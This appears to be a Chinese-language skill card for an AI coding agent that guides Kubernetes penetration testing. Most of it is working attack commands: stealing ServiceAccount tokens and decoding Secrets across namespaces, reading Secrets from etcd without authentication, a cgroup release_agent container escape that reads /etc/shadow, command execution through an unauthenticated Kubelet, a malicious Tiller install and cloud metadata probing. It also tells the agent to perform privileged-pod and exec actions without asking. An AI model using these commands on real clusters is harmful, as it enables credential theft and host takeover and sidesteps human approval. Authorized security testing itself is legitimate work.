---
name: 群瓮
category: cloud-infrastructure
priority: P1
description: >-
  云原生 K8s 安全总卡：kubectl 命令、SA token 利用、Pod 逃逸、RBAC 审计、etcd 未授权、
  CRI-O/containerd 逃逸、Helm/Tiller 利用、Ingress 注入、云厂商元数据链。
  触发：K8s RBAC、etcd:2379、特权 Pod、容器逃逸、ServiceAccount、kube-apiserver。
  IMDS / 169.254.169.254 立刻切 cloud-metadata-harvesting，不要停在本卡。
metadata:
  tags:
    - kubernetes
    - k8s
    - container
    - pod-escape
    - rbac
    - etcd
    - service-account
    - sa-token
    - privileged-pod
    - cri-containerd
    - helm
    - cloud-native
    - kube-apiserver
    - ingress
    - namespace
  score: 6
  version: "2.0"
  updated: "2026-09-04"
---

# 云原生 K8s 安全（Cursor Skill · score≥5 实战级）

> **定位**：从获取 K8s 集群访问（kubectl/SA token）开始，完成 RBAC 审计、Pod 逃逸、
> etcd 未授权读、横向移动到云厂商元数据的完整链。覆盖授权渗透中常见的容器/K8s 攻击面。

---

## 0. 硬闸

1. 目标集群必须在 `授权范围` 授权范围内。
2. **IMDS / 169.254.169.254** → 立刻切 `cloud-metadata-harvesting`，不要停在本卡。
3. 阿里云 AK/SK → `传承/云府·临钥.md`。
4. WolfStack / etcd:2379 已有专卡 → `wolfstack-hardcoded-secret` / `etcd-unauth`。
5. 特权 Pod / `pods/exec` 证明权 **授权内直接做**。删 Namespace、清集群、覆盖生产工作负载先问。
6. 只读 list pods/secrets/configmaps 默认直接做。

---

## 1. 真源 & 关联

| 资料 | 路径 |
|------|------|
| Playbook（Pod） | `传承/群瓮·特权.md` |
| Playbook（逃逸） | `传承/瓮中逃.md` |
| Playbook（AK-SK） | `传承/云府·临钥.md` |
| 路由工具 | `炼蛊房/reverse_skill_route.py --hint "K8s"` |
| CSS 百科 | `炼蛊房/css_query.py list-skills --module 33` |
| etcd 专卡 | `etcd-unauth` |
| 元数据专卡 | `cloud-metadata-harvesting` |
| 容器逃逸专卡 | `container-escape-techniques` |
| 云安全审计 | `cloud-security-audit` |

---

## 2. 攻击面分类

### 2.1 入口获取

| # | 入口 | 获取方式 |
|---|------|----------|
| A1 | SA Token 泄露 | Pod 内 `/var/run/secrets/kubernetes.io/serviceaccount/token` |
| A2 | kubeconfig 泄露 | `.kube/config` 在 heapdump / .env / Git 泄露 |
| A3 | kube-apiserver 未授权 | 6443/8443 无认证或匿名绑了 cluster-admin |
| A4 | etcd 未授权 | 2379 端口无认证，直读所有 Secret |
| A5 | Kubelet 未授权 | 10250 端口无认证，可 exec 进 Pod |
| A6 | Dashboard 未授权 | K8s Dashboard skip-login 或默认 token |
| A7 | Helm/Tiller 未授权 | Tiller 44134 无认证（Helm v2） |

### 2.2 权限提升

| # | 手法 | 前提 |
|---|------|------|
| P1 | 特权 Pod 逃逸 | `securityContext.privileged: true` |
| P2 | hostPID/hostNetwork | 挂宿主机 PID 命名空间或网络 |
| P3 | hostPath 挂载 | 挂载宿主机 `/` 或 `/etc` |
| P4 | SA 权限过大 | SA 有 `create pods`、`get secrets` 等 |
| P5 | RBAC 提权 | 可 `create clusterrolebinding` |
| P6 | CVE 内核逃逸 | runc / CRI-O / containerd CVE |

### 2.3 横向移动

| # | 手法 | 目标 |
|---|------|------|
| L1 | Secret 读取 | 数据库密码、API Key、TLS 证书 |
| L2 | ConfigMap 读取 | 配置文件、环境变量 |
| L3 | 跨 namespace | 从低权 namespace 到 kube-system |
| L4 | IMDS 元数据 | 云厂商实例元数据 → AK/SK |
| L5 | Service 枚举 | 内网服务发现 |

---

## 3. 实战命令

### 3.1 SA Token 利用（A1 — 最常见入口）

```bash
# ── 在 Pod 内提取 SA Token ──
SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA_CERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
API_SERVER="https://kubernetes.default.svc"

echo "[*] Namespace: $NAMESPACE"
echo "[*] Token (first 50 chars): ${SA_TOKEN:0:50}..."

# ── 测试 SA 权限 ──
curl -sk "$API_SERVER/api/v1/namespaces/$NAMESPACE/pods" \
  -H "Authorization: Bearer $SA_TOKEN" \
  --cacert $CA_CERT \
  -w '\nHTTP %{http_code}\n' | head -20

# ── 等价 kubectl（如果有） ──
kubectl --token="$SA_TOKEN" --server="$API_SERVER" \
  --certificate-authority=$CA_CERT \
  auth can-i --list
```

### 3.2 RBAC 权限审计

```bash
# ── 列出当前 SA 可以做什么 ──
kubectl auth can-i --list --namespace=$NAMESPACE

# ── 检查是否有危险权限 ──
kubectl auth can-i create pods --namespace=$NAMESPACE
kubectl auth can-i get secrets --namespace=$NAMESPACE
kubectl auth can-i create clusterrolebinding
kubectl auth can-i '*' '*'  # cluster-admin?

# ── 列出所有 ClusterRoleBinding（看谁是 cluster-admin） ──
kubectl get clusterrolebindings -o json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for item in data['items']:
    role = item.get('roleRef', {}).get('name', '')
    subjects = item.get('subjects', [])
    if role == 'cluster-admin':
        for s in subjects:
            print(f'[!] cluster-admin: {s.get(\"kind\")}/{s.get(\"name\")} in {s.get(\"namespace\", \"*\")}')
"

# ── 列出所有 SA 及其 Secret ──
kubectl get serviceaccounts --all-namespaces -o json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for item in data['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    secrets = [s['name'] for s in item.get('secrets', [])]
    if secrets:
        print(f'{ns}/{name}: {secrets}')
"
```

### 3.3 Secret 提取

```bash
# ── 列出当前 namespace 所有 Secret ──
kubectl get secrets -n $NAMESPACE -o json | python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
for item in data['items']:
    name = item['metadata']['name']
    stype = item.get('type', '')
    print(f'\n=== {name} ({stype}) ===')
    for k, v in item.get('data', {}).items():
        decoded = base64.b64decode(v).decode('utf-8', errors='replace')
        if len(decoded) > 200:
            decoded = decoded[:200] + '...'
        print(f'  {k}: {decoded}')
"

# ── 跨 namespace 读 Secret（如果有权限） ──
kubectl get secrets --all-namespaces -o json \
  | python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
for item in data['items']:
    ns = item['metadata']['namespace']
    name = item['metadata']['name']
    for k, v in item.get('data', {}).items():
        decoded = base64.b64decode(v).decode('utf-8', errors='replace')
        if any(x in k.lower() for x in ['password','secret','key','token','aws','access']):
            print(f'[!] {ns}/{name} → {k}: {decoded[:100]}')
"
```

### 3.4 etcd 未授权读取（A4）

```bash
# ── 探测 etcd 端口 ──
curl -sk "https://ETCD_IP:2379/version" 2>/dev/null || \
curl -sk "http://ETCD_IP:2379/version" 2>/dev/null
# 返回 JSON 版本信息 → 未授权

# ── 用 etcdctl 读所有 Key ──
ETCDCTL_API=3 etcdctl --endpoints=http://ETCD_IP:2379 \
  get / --prefix --keys-only | head -50

# ── 直接读 Secret（etcd 存储的 K8s Secret 是 base64 编码） ──
ETCDCTL_API=3 etcdctl --endpoints=http://ETCD_IP:2379 \
  get /registry/secrets --prefix --print-value-only \
  | strings | grep -E '(password|secret|key|token)' | head -20

# ── 无 etcdctl 时用 curl + API v3 ──
curl -sk "http://ETCD_IP:2379/v3/kv/range" \
  -X POST -d '{"key":"L3JlZ2lzdHJ5L3NlY3JldHM=","range_end":"L3JlZ2lzdHJ5L3NlY3JldHR="}' \
  | python3 -c "
import json, sys, base64
data = json.load(sys.stdin)
for kv in data.get('kvs', []):
    key = base64.b64decode(kv['key']).decode('utf-8', errors='replace')
    print(f'Key: {key}')
"
```

### 3.5 特权 Pod 逃逸（P1）

```bash
# ── 检查当前 Pod 是否特权 ──
cat /proc/1/status | grep -i cap
# CapEff: 000001ffffffffff → 全权限 → 特权容器

# ── 方法 1: 挂载宿主机文件系统 ──
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/vda1 /mnt/host
ls /mnt/host/etc/shadow
cat /mnt/host/etc/shadow | head -5
cat /mnt/host/root/.kube/config 2>/dev/null

# ── 方法 2: cgroup 逃逸（非 cgroup v2） ──
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -1))
mkdir -p $d/exploit
echo 1 > $d/exploit/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo 0 > $d/exploit/cgroup.procs"
sleep 1
cat /output

# ── 方法 3: nsenter 到宿主机（hostPID） ──
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### 3.6 Kubelet 未授权（A5）

```bash
# ── 探测 Kubelet 端口 ──
curl -sk "https://NODE_IP:10250/pods" | python3 -m json.tool | head -30
# 200 + Pod 列表 → 未授权

# ── 在 Pod 内执行命令 ──
curl -sk "https://NODE_IP:10250/run/<namespace>/<pod>/<container>" \
  -X POST -d "cmd=id"

# ── 列出所有 Pod 的环境变量（找密钥） ──
curl -sk "https://NODE_IP:10250/pods" | python3 -c "
import json, sys
data = json.load(sys.stdin)
for item in data.get('items', []):
    name = item['metadata']['name']
    ns = item['metadata']['namespace']
    for c in item['spec'].get('containers', []):
        envs = c.get('env', [])
        for e in envs:
            v = e.get('value', '')
            if any(x in e.get('name','').lower() for x in ['pass','secret','key','token']):
                print(f'[!] {ns}/{name}/{c[\"name\"]}: {e[\"name\"]}={v[:80]}')
"
```

### 3.7 K8s Dashboard 未授权（A6）

```bash
# ── 探测 Dashboard ──
curl -sk "https://TARGET:443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/" \
  -o /dev/null -w '%{http_code}'

# ── 常见端口 ──
for port in 8443 30000 31000 443; do
  code=$(curl -sk "https://TARGET:$port/" -o /dev/null -w '%{http_code}' --connect-timeout 3)
  echo "Port $port: $code"
done

# ── skip-login 检测 ──
curl -sk "https://TARGET:8443/api/v1/namespaces" \
  -H "Authorization: Bearer " \
  -w '\nHTTP %{http_code}\n' | head -5
# 200 → skip-login 启用
```

### 3.8 Helm/Tiller 未授权（A7，Helm v2）

```bash
# ── 探测 Tiller 端口 ──
curl -sk "http://TILLER_IP:44134/" -o /dev/null -w '%{http_code}'

# ── 用 helm 连接 ──
helm --host TILLER_IP:44134 ls
helm --host TILLER_IP:44134 install --name pwn stable/nginx-ingress \
  --set controller.hostNetwork=true
```

### 3.9 IMDS 元数据链（快速切换到 cloud-metadata-harvesting）

```bash
# ── 检测 IMDS 可达性 ──
curl -s --connect-timeout 2 "http://169.254.169.254/latest/meta-data/" && echo "AWS IMDS reachable"
curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/" && echo "GCP Metadata reachable"
curl -s --connect-timeout 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" && echo "Azure IMDS reachable"
curl -s --connect-timeout 2 "http://100.100.100.200/latest/meta-data/" && echo "Alibaba Cloud IMDS reachable"

# 命中 → 立刻切 cloud-metadata-harvesting
```

---

## 4. RBAC 审计 Python 脚本

```python
#!/usr/bin/env python3
"""k8s_rbac_audit.py - K8s RBAC 危险权限审计"""
import subprocess, json, sys

DANGEROUS_VERBS = {"*", "create", "update", "patch", "delete"}
DANGEROUS_RESOURCES = {
    "*", "secrets", "pods", "pods/exec", "clusterroles",
    "clusterrolebindings", "roles", "rolebindings",
    "serviceaccounts", "nodes", "daemonsets", "deployments"
}

def run_kubectl(args):
    r = subprocess.run(["kubectl"] + args + ["-o", "json"],
                       capture_output=True, text=True, timeout=30)
    return json.loads(r.stdout) if r.returncode == 0 else None

print("[*] Auditing ClusterRoles...")
data = run_kubectl(["get", "clusterroles"])
if data:
    for item in data["items"]:
        name = item["metadata"]["name"]
        for rule in item.get("rules", []):
            verbs = set(rule.get("verbs", []))
            resources = set(rule.get("resources", []))
            risky_verbs = verbs & DANGEROUS_VERBS
            risky_res = resources & DANGEROUS_RESOURCES
            if risky_verbs and risky_res:
                print(f"  [!] {name}: {risky_verbs} on {risky_res}")

print("\n[*] Auditing ServiceAccounts with mountable secrets...")
data = run_kubectl(["get", "sa", "--all-namespaces"])
if data:
    for item in data["items"]:
        ns = item["metadata"]["namespace"]
        name = item["metadata"]["name"]
        secrets = item.get("secrets", [])
        if name != "default" and secrets:
            print(f"  [*] {ns}/{name}: {len(secrets)} secret(s)")

print("\n[*] Checking anonymous access...")
r = subprocess.run(
    ["kubectl", "auth", "can-i", "--list", "--as=system:anonymous"],
    capture_output=True, text=True, timeout=10
)
if r.returncode == 0:
    for line in r.stdout.strip().split("\n"):
        if "*" in line or "get" in line:
            print(f"  [!] Anonymous: {line.strip()}")

print("\n[*] Done. Check cloud-metadata-harvesting for IMDS chain.")
```

---

## 5. 完整打击流程

```
Phase-0 入口发现
│ SA Token / kubeconfig / 端口扫描
│ etcd:2379 → 3.4 命令
│ Kubelet:10250 → 3.6 命令
│ Dashboard:8443 → 3.7 命令
│
Phase-1 权限审计
│ kubectl auth can-i --list（3.2）
│ RBAC 审计脚本（§4）
│ SA 权限枚举
│
Phase-2 Secret 提取
│ 当前 namespace Secret（3.3）
│ 跨 namespace（如有权限）
│ 敏感 ConfigMap
│
Phase-3 提权 / 逃逸
│ 特权 Pod → 3.5（cgroup/mount/nsenter）
│ hostPID/hostNetwork → nsenter
│ hostPath → 读宿主机文件
│ RBAC 提权 → create pod / clusterrolebinding
│
Phase-4 横向移动
│ IMDS 元数据 → cloud-metadata-harvesting
│ 内网 Service 枚举
│ 其他 namespace Pod exec
│
Phase-5 证据固化
│ 截图/JSON 保存到 案卷/<案>/接管/
│ 更新 STATUS.md
│ 敏感凭据脱敏后归档
```

---

## 6. 成功口径

| 档 | 成立条件 | 不算 |
|----|----------|------|
| L1 指纹 | 确认 K8s 集群存在 + 版本信息 | 只扫了端口未确认 |
| L2 面确认 | 读取到 Secret / Pod 列表 / RBAC 信息 / etcd 数据 | 只有 SA token 未利用 |
| L3 逃逸 | 特权 Pod 逃逸到宿主机 / 跨 namespace 读 Secret / IMDS 获取云凭据 | 写 Pod / 删资源未经授权 |

---

## 7. 速查：端口 → 手法

| 端口 | 服务 | 手法 | 命令参考 |
|------|------|------|----------|
| 2379 | etcd | 未授权读 Secret | §3.4 |
| 6443 | kube-apiserver | SA token / 匿名访问 | §3.1 |
| 8443 | Dashboard | skip-login | §3.7 |
| 10250 | Kubelet | 未授权 exec | §3.6 |
| 10255 | Kubelet (RO) | 只读 Pod 信息 | `curl http://IP:10255/pods` |
| 44134 | Tiller | Helm v2 未授权 | §3.8 |
| 30000-32767 | NodePort | 暴露的服务 | 逐个探测 |

---

## 8. 上下游 Skill

| 方向 | Skill | 说明 |
|------|-------|------|
| 上游 | `case-triage` | 定级后分发 |
| 上游 | `credential-harvest` | 从 heapdump / .env 拿到 kubeconfig |
| 下游 | `cloud-metadata-harvesting` | IMDS → AK/SK |
| 下游 | `container-escape-techniques` | 容器逃逸深度 |
| 下游 | `etcd-unauth` | etcd 未授权专项 |
| 下游 | `wolfstack-hardcoded-secret` | WolfStack + etcd |
| 横切 | `cloud-security-audit` | 云安全审计 |
| 横切 | `linux-privilege-escalation` | 宿主机提权 |
| Playbook | `传承/群瓮·特权.md` | Pod 逃逸 |
| Playbook | `传承/瓮中逃.md` | 容器逃逸 |
| Playbook | `传承/云府·临钥.md` | AK-SK 链 |
| CSS 百科 | 模块 17 / 33 | 云/K8s 分类知识 |

---

## 9. FAQ

1. **Q: 什么时候用本卡 vs cloud-metadata-harvesting？**
   A: 本卡是 K8s 集群层面（RBAC/Pod/Secret/etcd），IMDS 元数据链切 `cloud-metadata-harvesting`。

2. **Q: etcd 未授权和 `etcd-unauth` 卡有什么区别？**
   A: `etcd-unauth` 是独立 etcd 实例（如 WolfStack），本卡 §3.4 是 K8s 集群内置 etcd。手法类似，上下文不同。

3. **Q: 特权 Pod 逃逸用哪种方法？**
   A: 按优先级：mount 宿主机 → nsenter（需 hostPID）→ cgroup 逃逸。cgroup v2 下 cgroup 方法可能失效。

4. **Q: 写 Pod / DaemonSet 需要先问吗？**
   A: 证明用的特权 Pod / exec 授权内直接做。删 Namespace、全集群 DaemonSet、清工作负载先问。
